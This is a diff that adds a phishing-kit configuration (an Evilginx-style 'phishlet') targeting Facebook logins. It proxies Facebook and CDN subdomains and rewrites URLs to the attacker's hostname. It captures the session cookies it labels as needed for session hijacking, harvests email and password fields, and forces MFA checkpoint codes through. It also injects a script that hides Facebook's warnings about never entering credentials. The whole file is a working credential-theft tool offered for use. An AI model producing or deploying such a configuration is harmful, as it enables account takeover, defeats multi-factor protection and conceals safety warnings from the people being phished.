@@ -1,0 +1,117 @@
+# Facebook Phishlet Configuration - 2025 Enhanced
+# Based on Evilginx2/3 phishlet patterns
+
+name: 'facebook'
+author: 'MaxPhisher'
+version: '3.0.0'
+min_ver: '3.0.0'
+
+# Target domains configuration
+proxy_hosts:
+  # Primary mobile endpoint (landing)
+  - phish_sub: 'm'
+    orig_sub: 'm'
+    domain: 'facebook.com'
+    session: true
+    is_landing: true
+
+  # Desktop endpoint
+  - phish_sub: 'www'
+    orig_sub: 'www'
+    domain: 'facebook.com'
+    session: true
+
+  # Login endpoint
+  - phish_sub: 'login'
+    orig_sub: 'login'
+    domain: 'facebook.com'
+    session: true
+
+  # Static assets (CDN)
+  - phish_sub: 'static'
+    orig_sub: 'static'
+    domain: 'xx.fbcdn.net'
+    session: false
+
+  - phish_sub: 'scontent'
+    orig_sub: 'scontent'
+    domain: 'xx.fbcdn.net'
+    session: false
+
+# URL rewriting filters (HTML only)
+sub_filters:
+  # Rewrite main domain in HTML
+  - triggers_on: 'm.facebook.com'
+    orig_sub: 'm'
+    domain: 'facebook.com'
+    search: 'https://m.facebook.com'
+    replace: 'https://m.{hostname}'
+    mimes: ['text/html']
+    
+  - triggers_on: 'www.facebook.com'
+    orig_sub: 'www'
+    domain: 'facebook.com'
+    search: 'https://www.facebook.com'
+    replace: 'https://www.{hostname}'
+    mimes: ['text/html']
+
+# Session tokens to capture (priority order)
+auth_tokens:
+  - domain: '.facebook.com'
+    keys:
+      # CRITICAL - Required for session hijacking
+      - 'c_user'    # User ID
+      - 'xs'        # Main session token
+      
+      # RECOMMENDED - Device fingerprint
+      - 'fr'
+      
+      # OPTIONAL - Additional session data
+      - 'datr'      # Browser identifier
+      - 'sb'        # Security binding
+      - 'wd'        # Window dimensions
+      - 'presence'  # Presence token
+      - 'spin'      # Spin token
+
+# Credential field mappings
+credentials:
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+    
+  password:
+    key: 'pass'
+    search: '(.*)'
+    type: 'post'
+
+# Login page configuration
+login:
+  domain: 'm.facebook.com'
+  path: '/login/'
+
+# MFA/Checkpoint handling
+force_post:
+  - path: '/checkpoint/*'
+    search: []
+    force: ['approvals_code', 'verification_code']
+    
+  - path: '/login/checkpoint/*'
+    search: []
+    force: ['approvals_code']
+
+# JavaScript injection (backup method)
+js_inject:
+  - trigger_domains: ['m.facebook.com', 'www.facebook.com']
+    trigger_paths: ['/*']
+    script: |
+      // Injected by phishlet - backup warning hider
+      (function() {
+        setInterval(function() {
+          document.querySelectorAll('[role="dialog"]').forEach(function(el) {
+            if (el.textContent.indexOf('never enter') !== -1) {
+              el.style.display = 'none';
+            }
+          });
+        }, 500);
+      })();
